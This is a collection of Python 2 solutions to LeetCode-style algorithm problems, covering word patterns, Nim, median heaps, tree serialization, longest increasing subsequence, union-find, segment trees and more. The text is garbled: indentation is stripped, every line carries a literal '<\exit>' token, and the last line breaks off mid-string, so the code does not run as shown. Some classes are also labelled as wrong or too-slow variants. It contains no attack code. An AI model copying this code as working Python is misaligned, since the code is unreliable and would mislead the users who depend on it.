class Solution(object):<\exit>
def wordPattern(self, pattern, s):<\exit>
lst = s.split(" ")<\exit>
if len(pattern) != len(lst):<\exit>
return False<\exit>
char2word = {}<\exit>
words = set()<\exit>
for i in xrange(len(pattern)):<\exit>
if pattern[i] in char2word:<\exit>
if char2word[pattern[i]] != lst[i]:<\exit>
return False<\exit>
else:<\exit>
assert lst[i] in words<\exit>
else:<\exit>
if lst[i] in words:<\exit>
return False<\exit>
char2word[pattern[i]] = lst[i]<\exit>
words.add(lst[i])<\exit>
return True<\exit>
class OneToOneMap(object):<\exit>
def __init__(self):<\exit>
self.m = {}<\exit>
def set(self, a, b):<\exit>
self.m[a] = b<\exit>
self.m[b] = a<\exit>
def get(self, a):<\exit>
return self.m.get(a)<\exit>
class SolutionError(object):<\exit>
def wordPattern(self, pattern, str):<\exit>
m = OneToOneMap()<\exit>
lst = str.split(" ")<\exit>
if len(pattern) != len(lst):<\exit>
return False<\exit>
for i in xrange(len(pattern)):<\exit>
a = m.get(pattern[i])<\exit>
b = m.get(lst[i])<\exit>
if a is None and b is None:<\exit>
m.set(pattern[i], lst[i])<\exit>
elif a is None and b is not None:<\exit>
return False<\exit>
elif a != lst[i]:<\exit>
return False<\exit>
return True<\exit>
if __name__ == "__main__":<\exit>
assert Solution().wordPattern("abba", "dog cat cat dog") == True<\exit>
class Solution(object):<\exit>
def wordPatternMatch(self, pattern, s):<\exit>
return self.dfs(pattern, s, {}, set())<\exit>
def dfs(self, pattern, s, char2word, words):<\exit>
if not pattern and s or not s and pattern:<\exit>
return False<\exit>
if not pattern and not s:<\exit>
return True<\exit>
if pattern[0] in char2word:<\exit>
word = char2word[pattern[0]]<\exit>
if s[:len(word)] != word:<\exit>
return False<\exit>
else:<\exit>
assert word in words<\exit>
return self.dfs(pattern[1:], s[len(word):], char2word, words)<\exit>
else:<\exit>
for i in xrange(len(s)):<\exit>
word = s[:i+1]<\exit>
if word in words:<\exit>
continue<\exit>
char2word[pattern[0]] = word<\exit>
words.add(word)<\exit>
if self.dfs(pattern[1:], s[len(word):], char2word, words):<\exit>
return True<\exit>
words.remove(word)<\exit>
del char2word[pattern[0]]<\exit>
return False<\exit>
class Solution(object):<\exit>
def canWinNim(self, n):<\exit>
return n % 4 != 0<\exit>
def canWinNim_TLE(self, n):<\exit>
if n < 3:<\exit>
return True<\exit>
F = [False for _ in xrange(3)]<\exit>
F[1] = F[2] = F[0] = True<\exit>
for i in xrange(4, n+1):<\exit>
F[i%3] = any(not F[(i-k)%3] for k in xrange(1, 4))<\exit>
return F[n%3]<\exit>
def canWinNim_MLE(self, n):<\exit>
if n < 3:<\exit>
return True<\exit>
F = [False for _ in xrange(n+1)]<\exit>
F[1] = F[2] = F[3] = True<\exit>
for i in xrange(4, n+1):<\exit>
F[i] = any(not F[i-k] for k in xrange(1, 4))<\exit>
return F[n]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().canWinNim(5)<\exit>
class Solution(object):<\exit>
def generatePossibleNextMoves(self, s):<\exit>
ret = []<\exit>
for i in xrange(len(s)-1):<\exit>
if s[i:i+2] == "++":<\exit>
ret.append(s[:i]+"--"+s[i+2:])<\exit>
return ret<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.d = {}<\exit>
def canWin(self, s):<\exit>
if s not in self.d:<\exit>
flag = False<\exit>
for i in xrange(len(s)-1):<\exit>
if s[i:i+2] == "++":<\exit>
if not self.canWin(s[:i]+"--"+s[i+2:]):<\exit>
flag = True<\exit>
break<\exit>
self.d[s] = flag<\exit>
return self.d[s]<\exit>
def canWin_oneline(self, s):<\exit>
return any(not self.canWin_oneline(s[:i]+"--"+s[i+2:]) for i in xrange(len(s)-1) if s[i:i+2] == "++")<\exit>
def canWin_trivial(self, s):<\exit>
for i in xrange(len(s)-1):<\exit>
if s[i:i+2] == "++":<\exit>
if not self.canWin_trivial(s[:i]+"--"+s[i+2:]):<\exit>
return True<\exit>
return False<\exit>
if __name__ == "__main__":<\exit>
assert Solution().canWin("+++++") == False<\exit>
import heapq<\exit>
class DualHeap(object):<\exit>
def __init__(self):<\exit>
self.min_h = []<\exit>
self.max_h = []<\exit>
def insert(self, num):<\exit>
if not self.min_h or num > self.min_h[0]:<\exit>
heapq.heappush(self.min_h, num)<\exit>
else:<\exit>
heapq.heappush(self.max_h, -num)<\exit>
self.balance()<\exit>
def balance(self):<\exit>
l1 = len(self.min_h)<\exit>
l2 = len(self.max_h)<\exit>
if abs(l1 - l2) <= 1:<\exit>
return<\exit>
elif l1 - l2 > 1:<\exit>
heapq.heappush(self.max_h, -heapq.heappop(self.min_h))<\exit>
self.balance()<\exit>
else:<\exit>
heapq.heappush(self.min_h, -heapq.heappop(self.max_h))<\exit>
self.balance()<\exit>
def get_median(self):<\exit>
l1 = len(self.min_h)<\exit>
l2 = len(self.max_h)<\exit>
if (l1 + l2) % 2 == 1:<\exit>
m = (l1 + l2) / 2<\exit>
if m < l2:<\exit>
return -self.max_h[0]<\exit>
else:<\exit>
return self.min_h[0]<\exit>
else:<\exit>
return (-self.max_h[0] + self.min_h[0]) / 2.0<\exit>
class MedianFinder(object):<\exit>
def __init__(self):<\exit>
self.dh = DualHeap()<\exit>
def addNum(self, num):<\exit>
self.dh.insert(num)<\exit>
def findMedian(self):<\exit>
return self.dh.get_median()<\exit>
class Solution(object):<\exit>
def minTotalDistance_3lines(self, grid):<\exit>
x = sorted([i for i, row in enumerate(grid) for v in row if v == 1])<\exit>
y = sorted([j for row in grid for j, v in enumerate(row) if v == 1])<\exit>
return sum([abs(x[len(x)/2]-i)+abs(y[len(y)/2]-j) for i, row in enumerate(grid) for j, v in enumerate(row) if v == 1])<\exit>
def minTotalDistance(self, grid):<\exit>
x = []<\exit>
y = []<\exit>
m = len(grid)<\exit>
n = len(grid[0])<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
if grid[i][j] == 1:<\exit>
x.append(i)<\exit>
y.append(j)<\exit>
x.sort()<\exit>
y.sort()<\exit>
cnt = len(x)<\exit>
point = (x[cnt/2], y[cnt/2])<\exit>
ret = 0<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
if grid[i][j] == 1:<\exit>
ret += abs(point[0]-i)<\exit>
ret += abs(point[1]-j)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minTotalDistance([[1,0,0,0,1],[0,0,0,0,0],[0,0,1,0,0]]) == 6<\exit>
from collections import deque<\exit>
class TreeNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Codec:<\exit>
def serialize(self, root):<\exit>
if not root:<\exit>
return "null"<\exit>
ret = []<\exit>
q = []<\exit>
q.append(root)<\exit>
ret.append(str(root.val))<\exit>
while q:<\exit>
l = len(q)<\exit>
for i in xrange(l):<\exit>
cur = q[i]<\exit>
if cur.left: q.append(cur.left)<\exit>
ret.append(self.encode(cur.left))<\exit>
if cur.right: q.append(cur.right)<\exit>
ret.append(self.encode(cur.right))<\exit>
q = q[l:]<\exit>
return ",".join(ret)<\exit>
def deserialize(self, data):<\exit>
lst = data.split(",")<\exit>
root = self.decode(lst[0])<\exit>
q = deque([root])<\exit>
i = 1<\exit>
while q:<\exit>
cur = q.popleft()<\exit>
if i < len(lst):<\exit>
cur.left = self.decode(lst[i])<\exit>
i += 1<\exit>
if cur.left: q.append(cur.left)<\exit>
if i < len(lst):<\exit>
cur.right = self.decode(lst[i])<\exit>
i += 1<\exit>
if cur.right: q.append(cur.right)<\exit>
return root<\exit>
def decode(self, s):<\exit>
if s == "null":<\exit>
return None<\exit>
else:<\exit>
return TreeNode(int(s))<\exit>
def encode(self, node):<\exit>
if not node:<\exit>
return "null"<\exit>
else:<\exit>
return str(node.val)<\exit>
class TreeNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.gmax = 0<\exit>
def longestConsecutive(self, root):<\exit>
self.longest(root)<\exit>
return self.gmax<\exit>
def longest(self, cur):<\exit>
if not cur:<\exit>
return 0<\exit>
maxa = 1<\exit>
l = self.longest(cur.left)<\exit>
r = self.longest(cur.right)<\exit>
if cur.left and cur.val+1 == cur.left.val:<\exit>
maxa = max(maxa, l+1)<\exit>
if cur.right and cur.val+1 == cur.right.val:<\exit>
maxa = max(maxa, r+1)<\exit>
self.gmax = max(self.gmax, maxa)<\exit>
return maxa<\exit>
def longestConsecutive_error(self, root):<\exit>
if not root:<\exit>
return 0<\exit>
maxa = 1<\exit>
l = self.longestConsecutive(root.left)<\exit>
r = self.longestConsecutive(root.right)<\exit>
maxa = max(maxa, l, r)<\exit>
if root.left and root.val + 1 == root.left.val:<\exit>
maxa = max(maxa, l+1)<\exit>
if root.right and root.val + 1 == root.right.val:<\exit>
maxa = max(maxa, r+1)<\exit>
return maxa<\exit>
from collections import defaultdict<\exit>
class Solution(object):<\exit>
def getHint(self, secret, guess):<\exit>
cnt = defaultdict(int)<\exit>
A = 0<\exit>
B = 0<\exit>
for c in secret:<\exit>
cnt[c] += 1<\exit>
for i, v in enumerate(guess):<\exit>
if v == secret[i]:<\exit>
A += 1<\exit>
if cnt[v] > 0:<\exit>
cnt[v] -= 1<\exit>
else:<\exit>
B -= 1<\exit>
elif cnt[v] > 0:<\exit>
B += 1<\exit>
cnt[v] -= 1<\exit>
return "%dA%dB" % (A, B)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().getHint("0", "1") == "0A0B"<\exit>
from typing import List<\exit>
from bisect import bisect_left<\exit>
class Solution:<\exit>
def lengthOfLIS(self, nums: List[int]) -> int:<\exit>
F = [float('inf') for _ in nums]<\exit>
l = 0<\exit>
for n in nums:<\exit>
i = bisect_left(F, n)<\exit>
F[i] = n<\exit>
l = max(l, i + 1)<\exit>
return l<\exit>
import bisect<\exit>
class Solution(object):<\exit>
def lengthOfLIS(self, A):<\exit>
if not A:<\exit>
return 0<\exit>
n = len(A)<\exit>
MIN = [-1 for _ in xrange(n+1)]<\exit>
k = 1<\exit>
MIN[k] = A[0]<\exit>
for v in A[1:]:<\exit>
idx = bisect.bisect_left(MIN, v, 1, k+1)<\exit>
MIN[idx] = v<\exit>
k += 1 if idx == k+1 else 0<\exit>
return k<\exit>
def bin_search(self, M, A, t, lo=0, hi=None):<\exit>
if not hi: hi = len(M)<\exit>
while lo < hi:<\exit>
m = (lo+hi)/2<\exit>
if A[M[m]] == t:<\exit>
return m<\exit>
elif A[M[m]] < t:<\exit>
lo = m + 1<\exit>
else:<\exit>
hi = m<\exit>
return lo<\exit>
def lengthOfLIS_output_all(self, A):<\exit>
if not A:<\exit>
return 0<\exit>
n = len(A)<\exit>
MIN = [-1 for _ in xrange(n+1)]<\exit>
RET = [-1 for _ in xrange(n)]<\exit>
l = 1<\exit>
MIN[l] = 0<\exit>
for i in xrange(1, n):<\exit>
if A[i] > A[MIN[l]]:<\exit>
l += 1<\exit>
MIN[l] = i<\exit>
RET[i] = MIN[l-1]<\exit>
else:<\exit>
j = self.bin_search(MIN, A, A[i], 1, l+1)<\exit>
MIN[j] = i<\exit>
RET[i] = MIN[j-1] if j-1 >= 1 else -1<\exit>
cur = MIN[l]<\exit>
ret = []<\exit>
while True:<\exit>
ret.append(A[cur])<\exit>
if RET[cur] == -1: break<\exit>
cur = RET[cur]<\exit>
ret = ret[::-1]<\exit>
print ret<\exit>
return l<\exit>
def lengthOfLIS_dp(self, A):<\exit>
if not A:<\exit>
return 0<\exit>
n = len(A)<\exit>
F = [1 for _ in xrange(n)]<\exit>
maxa = 1<\exit>
for i in xrange(1, n):<\exit>
F[i] = max(<\exit>
F[j] + 1 if A[i] > A[j] else 1<\exit>
for j in xrange(i)<\exit>
)<\exit>
maxa = max(maxa, F[i])<\exit>
return maxa<\exit>
if __name__ == "__main__":<\exit>
assert Solution().lengthOfLIS([10, 9, 2, 5, 3, 7, 101, 18]) == 4<\exit>
class Solution(object):<\exit>
def removeInvalidParentheses(self, s):<\exit>
rmcnt = self.minrm(s)<\exit>
ret = []<\exit>
self.dfs(s, "", 0, None, 0, rmcnt, ret)<\exit>
return ret<\exit>
def minrm(self, s):<\exit>
rmcnt = 0<\exit>
left = 0<\exit>
for c in s:<\exit>
if c == "(":<\exit>
left += 1<\exit>
elif c == ")":<\exit>
if left > 0:<\exit>
left -= 1<\exit>
else:<\exit>
rmcnt += 1<\exit>
rmcnt += left<\exit>
return rmcnt<\exit>
def dfs(self, s, cur, left, pi, i, rmcnt, ret):<\exit>
if left < 0 or rmcnt < 0 or i > len(s):<\exit>
return<\exit>
if i == len(s):<\exit>
if rmcnt == 0 and left == 0:<\exit>
ret.append(cur)<\exit>
return<\exit>
if s[i] not in ("(", ")"):<\exit>
self.dfs(s, cur+s[i], left, None, i+1, rmcnt, ret)<\exit>
else:<\exit>
if pi == s[i]:<\exit>
while i < len(s) and pi and pi == s[i]: i, rmcnt = i+1, rmcnt-1<\exit>
self.dfs(s, cur, left, pi, i, rmcnt, ret)<\exit>
else:<\exit>
self.dfs(s, cur, left, s[i], i+1, rmcnt-1, ret)<\exit>
L = left+1 if s[i] == "(" else left-1<\exit>
self.dfs(s, cur+s[i], L, None, i+1, rmcnt, ret)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().removeInvalidParentheses("(a)())()") == ['(a())()', '(a)()()']<\exit>
import bisect<\exit>
class Solution(object):<\exit>
def minArea(self, image, x, y):<\exit>
m, n = len(image), len(image[0])<\exit>
yaxis = [<\exit>
1 if any(image[i][j] == "1" for i in xrange(m)) else 0<\exit>
for j in xrange(n)<\exit>
]<\exit>
xaxis = [<\exit>
1 if any(image[i][j] == "1" for j in xrange(n)) else 0<\exit>
for i in xrange(m)<\exit>
]<\exit>
y_lo = bisect.bisect_left(yaxis, 1, 0, y)<\exit>
y_hi = bisect.bisect_left(map(lambda e: 1^e, yaxis), 1, y)<\exit>
x_lo = bisect.bisect_left(xaxis, 1, 0, x)<\exit>
x_hi = bisect.bisect_left(map(lambda e: 1^e, xaxis), 1, x)<\exit>
return (y_hi-y_lo)*(x_hi-x_lo)<\exit>
if __name__ == "__main__":<\exit>
image = [<\exit>
"00",<\exit>
"10",<\exit>
]<\exit>
assert Solution().minArea(image, 1, 0) == 1<\exit>
class NumArray(object):<\exit>
def __init__(self, nums):<\exit>
n = len(nums)<\exit>
self.F = [0 for _ in xrange(n+1)]<\exit>
for i in xrange(1, n+1):<\exit>
self.F[i] = self.F[i-1] + nums[i-1]<\exit>
def sumRange(self, i, j):<\exit>
return self.F[j+1] - self.F[i]<\exit>
class NumMatrix(object):<\exit>
def __init__(self, matrix):<\exit>
m = len(matrix)<\exit>
if m == 0:<\exit>
self.F = None<\exit>
return<\exit>
n = len(matrix[0])<\exit>
self.F = [[0 for _ in xrange(n+1)] for _ in xrange(m+1)]<\exit>
for i in xrange(1, m+1):<\exit>
for j in xrange(1, n+1):<\exit>
self.F[i][j] = self.F[i-1][j]+self.F[i][j-1]-self.F[i-1][j-1]+matrix[i-1][j-1]<\exit>
def sumRegion(self, row1, col1, row2, col2):<\exit>
if not self.F:<\exit>
return 0<\exit>
return self.F[row2+1][col2+1] - self.F[row2+1][col1] - self.F[row1][col2+1] + self.F[row1][col1]<\exit>
from collections import namedtuple<\exit>
class UnionFind(object):<\exit>
def __init__(self, rows, cols):<\exit>
self.pi = [-1 for _ in xrange(rows*cols)]<\exit>
self.sz = [-1 for _ in xrange(rows*cols)]<\exit>
self.count = 0<\exit>
def add(self, item):<\exit>
if self.pi[item] == -1:<\exit>
self.pi[item] = item<\exit>
self.sz[item] = 1<\exit>
self.count += 1<\exit>
def union(self, a, b):<\exit>
pi1 = self._pi(a)<\exit>
pi2 = self._pi(b)<\exit>
if pi1 != pi2:<\exit>
if self.sz[pi1] > self.sz[pi2]:<\exit>
pi1, pi2 = pi2, pi1<\exit>
self.pi[pi1] = pi2<\exit>
self.sz[pi2] += self.sz[pi1]<\exit>
self.count -= 1<\exit>
def _pi(self, item):<\exit>
pi = self.pi[item]<\exit>
if item != pi:<\exit>
self.pi[item] = self._pi(pi)<\exit>
return self.pi[item]<\exit>
Op = namedtuple('Op', 'r c')<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.dirs = ((-1, 0), (1, 0), (0, -1), (0, 1))<\exit>
def numIslands2(self, n, m, operators):<\exit>
rows = n<\exit>
cols = m<\exit>
unroll = lambda x, y: x*cols + y<\exit>
mat = [[0 for _ in xrange(cols)] for _ in xrange(rows)]<\exit>
uf = UnionFind(rows, cols)<\exit>
ret = []<\exit>
for op in operators:<\exit>
op = Op(r=op[0], c=op[1])<\exit>
uf.add(unroll(op.r, op.c))<\exit>
mat[op.r][op.c] = 1<\exit>
for dir in self.dirs:<\exit>
x1 = op.r+dir[0]<\exit>
y1 = op.c+dir[1]<\exit>
if 0 <= x1 < rows and 0 <= y1 < cols and mat[x1][y1] == 1:<\exit>
uf.union(unroll(op.r, op.c), unroll(x1, y1))<\exit>
ret.append(uf.count)<\exit>
return ret<\exit>
class Solution(object):<\exit>
def isAdditiveNumber(self, num):<\exit>
n = len(num)<\exit>
for i in xrange(1, n):<\exit>
for j in xrange(i, n):<\exit>
if self.predicate(num, 0, i, j):<\exit>
return True<\exit>
return False<\exit>
def predicate(self, s, b, i, j):<\exit>
n1 = s[b:i]<\exit>
n2 = s[i:j]<\exit>
if b != 0 and j == len(s):<\exit>
return True<\exit>
if not n1 or not n2:<\exit>
return False<\exit>
if len(n1) > 1 and n1[0] == '0' or len(n2) > 1 and n2[0] == '0':<\exit>
return False<\exit>
n3 = str(int(n1)+int(n2))<\exit>
J = j+len(n3)<\exit>
if s[j:J] == n3:<\exit>
return self.predicate(s, i, j, J)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().isAdditiveNumber("12012122436")<\exit>
class BinaryIndexTree(object):<\exit>
def __init__(self, nums):<\exit>
n = len(nums)<\exit>
self.nums = [0 for _ in xrange(n+1)]<\exit>
self.N = [0 for _ in xrange(n+1)]<\exit>
for i, v in enumerate(nums):<\exit>
self.set(i+1, v)<\exit>
def _lowbit(self, a):<\exit>
return a & -a<\exit>
def set(self, i, val):<\exit>
diff = val - self.nums[i]<\exit>
self.nums[i] = val<\exit>
while i < len(self.N):<\exit>
self.N[i] += diff<\exit>
i += self._lowbit(i)<\exit>
def get(self, i):<\exit>
ret = 0<\exit>
while i > 0:<\exit>
ret += self.N[i]<\exit>
i -= self._lowbit(i)<\exit>
return ret<\exit>
class NumArray(object):<\exit>
def __init__(self, nums):<\exit>
self.bit = BinaryIndexTree(nums)<\exit>
def update(self, i, val):<\exit>
self.bit.set(i+1, val)<\exit>
def sumRange(self, i, j):<\exit>
return self.bit.get(j+1)-self.bit.get(i)<\exit>
class Solution(object):<\exit>
def maxProfit(self, A):<\exit>
n = len(A)<\exit>
if n == 0 or n == 1:<\exit>
return 0<\exit>
if n == 2:<\exit>
return max(0, A[1]-A[0])<\exit>
CD = 1<\exit>
F = [0 for _ in xrange(n)]<\exit>
M = [0 for _ in xrange(n)]<\exit>
F[1] = A[1]-A[0]<\exit>
M[1] = max(M[0], F[1])<\exit>
F[2] = max(A[2]-A[2-1-i] for i in xrange(2))<\exit>
M[2] = max(M[1], F[2])<\exit>
for i in xrange(3, n):<\exit>
F[i] = max(F[i-1]+A[i]-A[i-1], M[i-2-CD]+A[i]-A[i-1])<\exit>
M[i] = max(M[i-1], F[i])<\exit>
return M[-1]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().maxProfit([1, 2, 3, 0, 2]) == 3<\exit>
from collections import defaultdict<\exit>
class Solution(object):<\exit>
def findMinHeightTrees(self, n, edges):<\exit>
if not edges:<\exit>
return [0]<\exit>
V = {i: [] for i in xrange(n)}<\exit>
for a, b in edges:<\exit>
V[a].append(b)<\exit>
V[b].append(a)<\exit>
_, _, last = self.bfs(0, V)<\exit>
level, pi, last = self.bfs(last, V)<\exit>
ret = []<\exit>
cur = last<\exit>
for _ in xrange((level-1)/2):<\exit>
cur = pi[cur]<\exit>
ret.append(cur)<\exit>
if level%2 == 0:<\exit>
ret.append(pi[cur])<\exit>
return ret<\exit>
def bfs(self, s, V):<\exit>
visited = [False for _ in xrange(len(V))]<\exit>
pi = [-1 for _ in xrange(len(V))]<\exit>
last = s<\exit>
level = 0<\exit>
q = []<\exit>
q.append(s)<\exit>
while q:<\exit>
l = len(q)<\exit>
for i in xrange(l):<\exit>
cur = q[i]<\exit>
last = cur<\exit>
visited[cur] = True<\exit>
for nbr in V[cur]:<\exit>
if not visited[nbr]:<\exit>
pi[nbr] = cur<\exit>
q.append(nbr)<\exit>
q = q[l:]<\exit>
level += 1<\exit>
return level, pi, last<\exit>
class Solution_TLE(object):<\exit>
def findMinHeightTrees_TLE(self, n, edges):<\exit>
if not edges:<\exit>
return 0<\exit>
V = {i: [] for i in xrange(n)}<\exit>
for a, b in edges:<\exit>
V[a].append(b)<\exit>
V[b].append(a)<\exit>
ret = []<\exit>
mini = n<\exit>
for k in V.keys():<\exit>
l = self.bfs(k, V)<\exit>
if l < mini:<\exit>
ret = [k]<\exit>
mini = l<\exit>
elif l == mini:<\exit>
ret.append(k)<\exit>
return ret<\exit>
def bfs(self, s, V):<\exit>
visisted = [False for _ in xrange(len(V))]<\exit>
q = []<\exit>
level = 0<\exit>
q.append(s)<\exit>
while q:<\exit>
l = len(q)<\exit>
for i in xrange(l):<\exit>
cur = q[i]<\exit>
visisted[cur] = True<\exit>
for nbr in V[cur]:<\exit>
if not visisted[nbr]:<\exit>
q.append(nbr)<\exit>
q = q[l:]<\exit>
level += 1<\exit>
return level<\exit>
class SolutionError(object):<\exit>
def findMinHeightTrees(self, n, edges):<\exit>
if not edges:<\exit>
return 0<\exit>
V = {i: [] for i in xrange(n)}<\exit>
for a, b in edges:<\exit>
V[a].append(b)<\exit>
V[b].append(a)<\exit>
leaf = None<\exit>
for k, v in V.items():<\exit>
if len(v) == 1:<\exit>
leaf = k<\exit>
break<\exit>
visisted = [False for _ in xrange(n)]<\exit>
h2v = defaultdict(list)<\exit>
q = []<\exit>
level = 0<\exit>
q.append(leaf)<\exit>
while q:<\exit>
l = len(q)<\exit>
for i in xrange(l):<\exit>
cur = q[i]<\exit>
h2v[level].append(cur)<\exit>
visisted[cur] = True<\exit>
for nbr in V[cur]:<\exit>
if not visisted[nbr]:<\exit>
q.append(nbr)<\exit>
q = q[l:]<\exit>
level += 1<\exit>
if level%2 == 0:<\exit>
return h2v[level/2-1]+h2v[level/2]<\exit>
else:<\exit>
return h2v[level/2]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findMinHeightTrees(7, [[0, 1], [1, 2], [1, 3], [2, 4], [3, 5], [4, 6]]) == [1, 2]<\exit>
class Solution(object):<\exit>
def multiply(self, A, B):<\exit>
m, n = len(A), len(A[0])<\exit>
A1 = [{} for _ in xrange(m)]<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
if A[i][j] != 0:<\exit>
A1[i][j] = A[i][j]<\exit>
m, n = len(B), len(B[0])<\exit>
B1 = [{} for _ in xrange(n)]<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
if B[i][j] != 0:<\exit>
B1[j][i] = B[i][j]<\exit>
ret = [[0 for _ in xrange(len(B[0]))] for _ in xrange(len(A))]<\exit>
for i, row in enumerate(A1):<\exit>
for j, col in enumerate(B1):<\exit>
s = 0<\exit>
for k in row.keys():<\exit>
if k in col:<\exit>
s += row[k]*col[k]<\exit>
ret[i][j] = s<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
A = [<\exit>
[1, 0, 0],<\exit>
[-1, 0, 3]<\exit>
]<\exit>
B = [<\exit>
[7, 0, 0],<\exit>
[0, 0, 0],<\exit>
[0, 0, 1]<\exit>
]<\exit>
assert Solution().multiply(A, B) == [[7, 0, 0], [-7, 0, 3]]<\exit>
class Solution(object):<\exit>
def maxCoins(self, A):<\exit>
n = len(A)<\exit>
def get(i):<\exit>
if i < 0 or i >= n: return 1<\exit>
return A[i]<\exit>
F = [[0 for _ in xrange(n+1)] for _ in xrange(n+1)]<\exit>
for i in xrange(n+1, -1, -1):<\exit>
for j in xrange(i+1, n+1):<\exit>
F[i][j] = max(<\exit>
F[i][k]+get(i-1)*get(k)*get(j)+F[k+1][j]<\exit>
for k in xrange(i, j)<\exit>
)<\exit>
return max(map(max, F))<\exit>
if __name__ == "__main__":<\exit>
assert Solution().maxCoins([3, 1, 5, 8]) == 167<\exit>
import heapq<\exit>
from collections import deque<\exit>
import sys<\exit>
class Solution(object):<\exit>
def nthSuperUglyNumber(self, n, primes):<\exit>
k = len(primes)<\exit>
ret = [sys.maxint for _ in xrange(n)]<\exit>
ret[0] = 1<\exit>
idxes = [0 for _ in xrange(k)]<\exit>
for i in xrange(1, n):<\exit>
for j in xrange(k):<\exit>
ret[i] = min(ret[i], primes[j]*ret[idxes[j]])<\exit>
for j in xrange(k):<\exit>
if ret[i] == primes[j]*ret[idxes[j]]:<\exit>
idxes[j] += 1<\exit>
return ret[n-1]<\exit>
class QueueWrapper(object):<\exit>
def __init__(self, idx, q):<\exit>
self.idx = idx<\exit>
self.q = q<\exit>
def __cmp__(self, other):<\exit>
return self.q[0] - other.q[0]<\exit>
class SolutionHeap(object):<\exit>
def nthSuperUglyNumber(self, n, primes):<\exit>
ret = 1<\exit>
h = [QueueWrapper(i, deque([v])) for i, v in enumerate(primes)]<\exit>
dic = {e.idx: e for e in h}<\exit>
heapq.heapify(h)<\exit>
for _ in xrange(n-1):<\exit>
mini = heapq.heappop(h)<\exit>
ret = mini.q.popleft()<\exit>
for i in xrange(mini.idx, len(primes)):<\exit>
dic[i].q.append(ret*primes[i])<\exit>
heapq.heappush(h, mini)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().nthSuperUglyNumber(12, [2, 7, 13, 19]) == 32<\exit>
class TreeNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution(object):<\exit>
def verticalOrder(self, root):<\exit>
l = self.leftmost(root, 0)<\exit>
r = self.rightmost(root, 0)<\exit>
ret = [[] for _ in xrange(r-l-1)]<\exit>
self.bfs(root, -l-1, ret)<\exit>
return ret<\exit>
def bfs(self, cur, col, ret):<\exit>
q = []<\exit>
if cur:<\exit>
q.append((cur, col))<\exit>
while q:<\exit>
l = len(q)<\exit>
for i in xrange(l):<\exit>
v, c = q[i]<\exit>
ret[c].append(v.val)<\exit>
if v.left: q.append((v.left, c-1))<\exit>
if v.right: q.append((v.right, c+1))<\exit>
q = q[l:]<\exit>
def leftmost(self, cur, l):<\exit>
if not cur: return l<\exit>
return min(self.leftmost(cur.left, l-1), self.leftmost(cur.right, l+1))<\exit>
def rightmost(self, cur, r):<\exit>
if not cur: return r<\exit>
return max(self.rightmost(cur.left, r-1), self.rightmost(cur.right, r+1))<\exit>
def sidemost(self, cur, p, f):<\exit>
if not cur: return p<\exit>
return f(self.sidemost(cur.left, p-1, f), self.sidemost(cur.right, p+1, f))<\exit>
class TreeNode(object):<\exit>
def __init__(self, start, end, cnt=0):<\exit>
self.start = start<\exit>
self.end = end<\exit>
self.cnt = cnt<\exit>
self.left = None<\exit>
self.right = None<\exit>
class SegmentTree(object):<\exit>
def __init__(self, n):<\exit>
self.root = self.build(0, n)<\exit>
def build(self, start, end):<\exit>
if start >= end: return<\exit>
if start == end-1: return TreeNode(start, end)<\exit>
node = TreeNode(start, end)<\exit>
node.left = self.build(start, (start+end)/2)<\exit>
node.right = self.build((start+end)/2, end)<\exit>
return node<\exit>
def inc(self, idx, val):<\exit>
cur = self.root<\exit>
while cur:<\exit>
cur.cnt += val<\exit>
mid = (cur.start+cur.end)/2<\exit>
if cur.start <= idx < mid:<\exit>
cur = cur.left<\exit>
elif mid <= idx < cur.end:<\exit>
cur = cur.right<\exit>
else:<\exit>
return<\exit>
def query_less(self, cur, idx):<\exit>
if not cur:<\exit>
return 0<\exit>
mid = (cur.start+cur.end)/2<\exit>
if cur.start <= idx < mid:<\exit>
return self.query_less(cur.left, idx)<\exit>
elif mid <= idx < cur.end:<\exit>
return (cur.left.cnt if cur.left else 0) + self.query_less(cur.right, idx)<\exit>
else:<\exit>
return 0<\exit>
class Solution(object):<\exit>
def countSmaller(self, nums):<\exit>
h = {}<\exit>
for i, v in enumerate(sorted(nums)):<\exit>
h[v] = i<\exit>
A = [h[v] for v in nums]<\exit>
n = len(A)<\exit>
st = SegmentTree(n)<\exit>
ret = []<\exit>
for i in xrange(n-1, -1, -1):<\exit>
ret.append(st.query_less(st.root, A[i]))<\exit>
st.inc(A[i], 1)<\exit>
return ret[::-1]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().countSmaller([5, 2, 6, 1]) == [2, 1, 1, 0]<\exit>
assert Solution().countSmaller([-1, -1]) == [0, 0]<\exit>
class Solution(object):<\exit>
def removeDuplicateLetters(self, s):<\exit>
last_pos = [-1 for _ in xrange(26)]<\exit>
n = len(s)<\exit>
for i in xrange(n-1, -1, -1):<\exit>
if last_pos[self._idx(s[i])] == -1:<\exit>
last_pos[self._idx(s[i])] = i<\exit>
stk = []<\exit>
stk_set = set()<\exit>
for i in xrange(n):<\exit>
v = s[i]<\exit>
if v not in stk_set:<\exit>
while stk and stk[-1] > v and last_pos[self._idx(stk[-1])] > i:<\exit>
p = stk.pop()<\exit>
stk_set.remove(p)<\exit>
stk.append(v)<\exit>
stk_set.add(v)<\exit>
return "".join(stk)<\exit>
def _idx(self, x):<\exit>
return ord(x) - ord('a')<\exit>
if __name__ == "__main__":<\exit>
assert Solution().removeDuplicateLetters("cbacdcbc") == "acdb<\exit>
